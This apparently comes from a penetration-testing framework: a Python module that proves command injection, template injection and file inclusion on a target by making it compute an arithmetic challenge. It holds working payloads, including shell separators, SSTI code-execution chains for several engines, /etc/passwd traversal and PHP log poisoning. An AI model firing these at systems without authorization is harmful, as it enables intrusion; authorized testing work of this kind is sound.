"""Command execution — prove the shell, don't just suspect the injection.

Reflection is the default failure mode of naive command-injection checks: the
payload comes back in the body and a scanner counts that as RCE. The proofs
here are all *computed* by the target:

  * output-based: the injected shell evaluates `$((a*b))` and echoes the
    product; the request contains the operands, never the product, so a
    reflected payload cannot satisfy the oracle;
  * time-based blind: a `sleep` payload must cost seconds over its own control
    on two independent probes;
  * SSTI→RCE: an engine-specific chain runs `echo $((a*b))` and the page must
    return the product;
  * LFI→RCE: a PHP payload is written into a log through the User-Agent and
    included through the file parameter; the product only appears when the
    include *executes* the code.

Every action is HIGH risk and therefore ceiling-gated: it runs only when the
operator has raised `--max-risk` to HIGH for an authorized engagement.
"""

import secrets
import time

from actions.registry import action, ActionContext, ActionResult
from actions.web.http_util import (body as _body, dedupe_param,
                                   session_headers, status as _status)
from tools.wrappers import curl


def _challenge() -> tuple:
    """Two operands and their product, sized so the product is collision-free."""
    a = secrets.randbelow(80) + 11
    b = secrets.randbelow(80) + 11
    return a, b, a * b


def _computed(body: str, expected: int, a: int, b: int) -> bool:
    """The target computed `a*b`; the response is not an echo of the request."""
    text = str(body or "")
    return str(expected) in text and f"{a}*{b}" not in text


def _shell_payloads(a: int, b: int) -> list:
    expr = f"$(({a}*{b}))"
    return [
        ("semicolon", f"; echo {expr}"),
        ("pipe", f"| echo {expr}"),
        ("and", f"&& echo {expr}"),
        ("or", f"|| echo {expr}"),
        ("subshell", f"$(echo {expr})"),
        ("backtick", f"`echo {expr}`"),
        ("newline", f"\necho {expr}"),
        ("brace", f";echo {expr};"),
        ("win-amp", f"& set /a {a}*{b}"),
        ("win-pipe", f"| set /a {a}*{b}"),
    ]


def _time_payloads(seconds: float) -> list:
    delay = f"{seconds:g}"
    return [
        ("linux-semicolon", f"; sleep {delay}"),
        ("linux-pipe", f"| sleep {delay}"),
        ("linux-subshell", f"$(sleep {delay})"),
        ("linux-backtick", f"`sleep {delay}`"),
        ("win-amp", f"& ping -n {int(seconds) + 1} 127.0.0.1"),
        ("win-pipe", f"| ping -n {int(seconds) + 1} 127.0.0.1"),
    ]


async def _timed(url: str, param: str, value: str, method: str,
                 headers: dict, timeout: int = 15) -> tuple:
    start = time.monotonic()
    raw = await curl(dedupe_param(url, param, value), method=method,
                     headers=headers, output="full", follow_redirects=False,
                     timeout=timeout)
    return time.monotonic() - start, raw


@action(
    id="web.cmd_injection",
    risk="HIGH",
    detectability="high",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=180,
    description=(
        "Prove OS command injection: the target must compute and echo an "
        "arithmetic challenge (output-based), or a sleep payload must cost "
        "seconds over its control on two probes (time-based blind)."
    ),
    category="web",
)
async def cmd_injection(ctx: ActionContext) -> ActionResult:
    url = str(ctx.params.get("url") or ctx.target or "").strip()
    param = str(ctx.params.get("param") or "").strip()
    if not url or not param:
        return ActionResult(False, error="url and param are required")
    method = str(ctx.params.get("method") or "GET").upper()
    headers = session_headers(ctx)

    baseline = await curl(dedupe_param(url, param, "bhs-baseline"),
                          method=method, headers=headers, output="full",
                          follow_redirects=False)
    if not baseline.get("status"):
        return ActionResult(
            False, confidence="TENTATIVE",
            error="baseline request failed; injection not tested")

    a, b, expected = _challenge()
    for label, payload in _shell_payloads(a, b):
        raw = await curl(dedupe_param(url, param, payload), method=method,
                         headers=headers, output="full",
                         follow_redirects=False)
        if str(expected) in _body(baseline):
            continue
        if _computed(_body(raw), expected, a, b):
            again = await curl(dedupe_param(url, param, payload),
                               method=method, headers=headers, output="full",
                               follow_redirects=False)
            if not _computed(_body(again), expected, a, b):
                continue
            return ActionResult(
                True, confidence="CONFIRMED",
                data={"url": url, "param": param, "technique": "output",
                      "separator": label, "payload": payload,
                      "computed": expected, "status": _status(raw)},
                evidence={"action": "web.cmd_injection",
                          "technique": "output-based",
                          "separator": label,
                          "proof": f"shell computed {a}*{b}={expected}"},
            )

    # Time-based blind: a sleep payload is only evidence when the endpoint is
    # otherwise fast and the delay reproduces. Two slow probes, one control.
    seconds = float(ctx.params.get("sleep_seconds") or 6)
    threshold = max(0.02, seconds * 0.6)
    control, _ = await _timed(url, param, "bhs-sleep-control", method, headers,
                              timeout=int(seconds) + 15)
    for label, payload in _time_payloads(seconds):
        first, _raw = await _timed(url, param, payload, method, headers,
                                   timeout=int(seconds) + 15)
        if first - control < threshold:
            continue
        second, _raw2 = await _timed(url, param, payload, method, headers,
                                     timeout=int(seconds) + 15)
        if second - control < threshold:
            continue
        return ActionResult(
            True, confidence="CONFIRMED",
            data={"url": url, "param": param, "technique": "time",
                  "separator": label, "payload": payload,
                  "control_seconds": round(control, 2),
                  "probe_seconds": [round(first, 2), round(second, 2)]},
            evidence={"action": "web.cmd_injection",
                      "technique": "time-based blind",
                      "delay_seconds": round(min(first, second) - control, 2)},
        )

    return ActionResult(
        False, confidence="TENTATIVE",
        error="no command execution confirmed (output and timing oracles both negative)")


# ── SSTI → code execution ────────────────────────────────────────────────

_SSTI_RCE = (
    ("jinja2-cycler",
     "{{ cycler.__init__.__globals__.os.popen('echo $(({a}*{b}))').read() }}"),
    ("jinja2-lipsum",
     "{{ lipsum.__globals__['os'].popen('echo $(({a}*{b}))').read() }}"),
    ("twig-filter",
     "{{ ['echo $(({a}*{b}))']|filter('system') }}"),
    ("twig-getfilter",
     "{{ _self.env.registerUndefinedFilterCallback('system') }}"
     "{{ _self.env.getFilter('echo $(({a}*{b}))') }}"),
    ("freemarker-execute",
     "<#assign ex='freemarker.template.utility.Execute'?new()>"
     "${ex('echo $(({a}*{b}))')}"),
    ("erb-backtick", "<%= `echo $(({a}*{b}))` %>"),
    ("smarty-system", "{system('echo $(({a}*{b}))')}"),
    ("pug-execsync",
     "= global.process.mainModule.require('child_process')"
     ".execSync('echo $(({a}*{b}))').toString()"),
    ("mako-popen",
     "${self.module.cache.util.os.popen('echo $(({a}*{b}))').read()}"),
)


@action(
    id="web.ssti.rce",
    risk="HIGH",
    detectability="high",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=180,
    description=(
        "Escalate template injection to code execution: an engine-specific "
        "chain runs a shell arithmetic challenge and the page must return the "
        "computed product, not the payload."
    ),
    category="web",
)
async def ssti_rce(ctx: ActionContext) -> ActionResult:
    url = str(ctx.params.get("url") or ctx.target or "").strip()
    param = str(ctx.params.get("param") or "").strip()
    if not url or not param:
        return ActionResult(False, error="url and param are required")
    method = str(ctx.params.get("method") or "GET").upper()
    headers = session_headers(ctx)

    baseline = await curl(dedupe_param(url, param, "bhs-baseline"),
                          method=method, headers=headers, output="full",
                          follow_redirects=False)
    if not baseline.get("status"):
        return ActionResult(False, confidence="TENTATIVE",
                            error="baseline request failed")

    a, b, expected = _challenge()
    for label, template in _SSTI_RCE:
        # Not str.format: several engine payloads legitimately contain braces.
        payload = template.replace("{a}", str(a)).replace("{b}", str(b))
        raw = await curl(dedupe_param(url, param, payload), method=method,
                         headers=headers, output="full",
                         follow_redirects=False)
        if not _computed(_body(raw), expected, a, b):
            continue
        again = await curl(dedupe_param(url, param, payload), method=method,
                           headers=headers, output="full",
                           follow_redirects=False)
        if not _computed(_body(again), expected, a, b):
            continue
        return ActionResult(
            True, confidence="CONFIRMED",
            data={"url": url, "param": param, "engine": label,
                  "computed": expected, "status": _status(raw)},
            evidence={"action": "web.ssti.rce", "engine": label,
                      "proof": f"template ran echo {a}*{b}={expected}"},
        )

    return ActionResult(
        False, confidence="TENTATIVE",
        error="no template engine executed the command payload")


# ── LFI → code execution ─────────────────────────────────────────────────

_LOG_FILES = (
    "/var/log/apache2/access.log",
    "/var/log/apache/access.log",
    "/var/log/nginx/access.log",
    "/var/log/httpd/access_log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/error.log",
    "/usr/local/apache/log/access_log",
    "/proc/self/environ",
)

_TRAVERSAL = "../" * 10
_PASSWD = "root:x:0:0:"


def _include(path: str) -> str:
    return _TRAVERSAL + path.lstrip("/")


@action(
    id="web.lfi.rce",
    risk="HIGH",
    detectability="high",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=240,
    description=(
        "Escalate a confirmed file-inclusion parameter to code execution: "
        "write a PHP arithmetic payload into an access log via User-Agent, "
        "include the log, and require the computed product (raw source echoed "
        "back does not count)."
    ),
    category="web",
)
async def lfi_rce(ctx: ActionContext) -> ActionResult:
    url = str(ctx.params.get("url") or ctx.target or "").strip()
    param = str(ctx.params.get("param") or "").strip()
    if not url or not param:
        return ActionResult(False, error="url and param are required")
    method = str(ctx.params.get("method") or "GET").upper()
    headers = session_headers(ctx)

    # Self-check: the parameter has to be file inclusion before escalation is
    # meaningful. A traversal that reads /etc/passwd is proof; anything less
    # returns a clean "not LFI" rather than a lucky code-execution claim.
    probe = await curl(dedupe_param(url, param, _include("/etc/passwd")),
                       method=method, headers=headers, output="full",
                       follow_redirects=False)
    if _PASSWD not in _body(probe):
        return ActionResult(
            False, confidence="TENTATIVE",
            error="file inclusion not confirmed; refusing to escalate blind")

    a, b, expected = _challenge()
    php = f"<?php echo {a}*{b}; ?>"
    poison_headers = dict(headers)
    poison_headers["User-Agent"] = php
    # Write the payload into the log first, on the same host and path.
    await curl(url, method=method, headers=poison_headers, output="full",
               follow_redirects=False)

    for log_path in _LOG_FILES:
        raw = await curl(dedupe_param(url, param, _include(log_path)),
                         method=method, headers=poison_headers, output="full",
                         follow_redirects=False)
        text = _body(raw)
        if str(expected) not in text or "<?php" in text:
            # Either the include failed or the log line was echoed as text:
            # raw source is not execution.
            continue
        again = await curl(dedupe_param(url, param, _include(log_path)),
                           method=method, headers=poison_headers,
                           output="full", follow_redirects=False)
        if str(expected) not in _body(again):
            continue
        return ActionResult(
            True, confidence="CONFIRMED",
            data={"url": url, "param": param, "technique": "log-poisoning",
                  "log": log_path, "computed": expected,
                  "status": _status(raw)},
            evidence={"action": "web.lfi.rce", "technique": "log poisoning",
                      "log": log_path,
                      "proof": f"included PHP computed {a}*{b}={expected}"},
        )

    return ActionResult(
        False, confidence="TENTATIVE",
        error=("file inclusion confirmed, but no log line executed the "
               "poisoned payload"))
